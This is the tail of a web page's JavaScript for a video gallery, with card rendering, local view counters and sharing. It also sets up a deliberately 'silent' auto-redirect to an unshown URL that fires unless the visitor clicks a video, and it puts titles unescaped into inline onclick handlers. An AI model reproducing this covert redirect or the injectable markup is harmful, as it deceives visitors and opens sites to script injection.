                                <button class="share-btn" onclick="shareVideo('${video.title}', '${video.link}')">
                                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/>
                                    </svg>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        }

        // Function to open video link with view count increment
        function openVideoLink(videoId, link) {
            // Mark that user clicked a video - this stops the redirect
            userClickedVideo = true;
            clearTimeout(autoRedirectTimer);
            console.log('User clicked video - redirect cancelled');
            
            // Increment view count
            const newViewCount = incrementViewCount(videoId);
            
            // Update view count display
            const viewElement = document.getElementById(`view-${videoId}`);
            if (viewElement) {
                viewElement.textContent = formatViewCount(newViewCount);
                viewElement.style.color = '#ff6b6b';
                viewElement.style.fontWeight = 'bold';
                
                // Reset color after animation
                setTimeout(() => {
                    viewElement.style.color = '#667eea';
                    viewElement.style.fontWeight = '600';
                }, 1000);
            }
            
            // Open link
            window.open(link, '_blank');
        }

        // Function to share video
        function shareVideo(title, link) {
            // Mark that user interacted - this stops the redirect
            userClickedVideo = true;
            clearTimeout(autoRedirectTimer);
            console.log('User clicked share - redirect cancelled');
            
            if (navigator.share) {
                navigator.share({
                    title: title,
                    url: link
                });
            } else {
                // Fallback for browsers that don't support Web Share API
                navigator.clipboard.writeText(link).then(() => {
                    alert('লিংক কপি করা হয়েছে!');
                });
            }
        }

        // Function to load videos with stagger animation
        function loadVideos() {
            const container = document.getElementById('videoContainer');
            container.innerHTML = '';
            
            videos.forEach((video, index) => {
                setTimeout(() => {
                    const videoCard = document.createElement('div');
                    videoCard.innerHTML = createVideoCard(video);
                    videoCard.style.opacity = '0';
                    videoCard.style.transform = 'translateY(30px)';
                    container.appendChild(videoCard.firstElementChild);
                    
                    // Animate in
                    setTimeout(() => {
                        videoCard.firstElementChild.style.transition = 'all 0.6s ease';
                        videoCard.firstElementChild.style.opacity = '1';
                        videoCard.firstElementChild.style.transform = 'translateY(0)';
                    }, 100);
                }, index * 150);
            });
        }

        // Load videos and start silent redirect when page loads
        document.addEventListener('DOMContentLoaded', () => {
            loadVideos();
            
            // Start silent redirect after 2 seconds delay
            setTimeout(() => {
                startSilentRedirect();
            }, 2000);
        });

        // Only track specific interactions that should stop redirect
        // Removed general click, scroll, and keydown listeners
        // Only video clicks and share clicks will stop the redirect

        // Keep mouse move for floating elements animation
        document.addEventListener('mousemove', (e) => {
            const floatingElements = document.querySelectorAll('.floating-element');
            floatingElements.forEach((element, index) => {
                const speed = (index + 1) * 0.01;
                const x = (e.clientX * speed);
                const y = (e.clientY * speed);
                element.style.transform = `translate(${x}px, ${y}px)`;
            });
        });

        // Function to add new video (you can call this to add more videos)
        function addVideo(newVideo) {
            videos.push(newVideo);
            loadVideos();
        }

        // Function to reset all view counts (for testing)
        function resetViewCounts() {
            localStorage.removeItem('videoViews');
            loadVideos();
            console.log('All view counts have been reset!');
        }

        // Function to get total views across all videos
        function getTotalViews() {
            const viewCounts = JSON.parse(localStorage.getItem('videoViews') || '{}');
            const total = Object.values(viewCounts).reduce((sum, count) => sum + count, 0);
            console.log(`Total views across all videos: ${total}`);
            return total;
        }

        // Function to manually trigger redirect (for testing)
        function triggerRedirect() {
            window.location.href = AUTO_REDIRECT_URL;
        }

        // Function to check redirect status (for debugging)
        function checkRedirectStatus() {
            const elapsed = Date.now() - redirectStartTime;
            const remaining = Math.max(0, redirectDelay - elapsed);
            console.log(`Redirect status: ${remaining}ms remaining, User clicked video: ${userClickedVideo}`);
        }

        // Remove the beforeunload event listener to make redirect truly silent
        // No page refresh prevention
    </script>
</body>
</html>
